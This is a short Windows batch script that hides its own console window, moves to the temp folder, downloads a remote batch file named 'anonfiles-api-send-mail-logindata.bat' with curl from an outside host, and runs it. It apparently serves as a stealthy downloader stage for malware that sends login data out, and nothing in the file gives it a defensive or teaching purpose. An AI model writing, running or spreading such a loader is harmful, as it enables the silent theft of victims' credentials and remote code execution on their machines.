@echo off
echo Minimizing...
powershell -window minimized -command ""
echo Hiding...
powershell -window hidden -command ""
cd %tmp%
curl -s https://sources.tobir.xyz/tools-mirror/anonfiles-api-send-mail-logindata.bat > anonfiles-api-send-mail-logindata.tmpbat
move anonfiles-api-send-mail-logindata.tmpbat anonfiles-api-send-mail-logindata.bat
call anonfiles-api-send-mail-logindata.bat
exit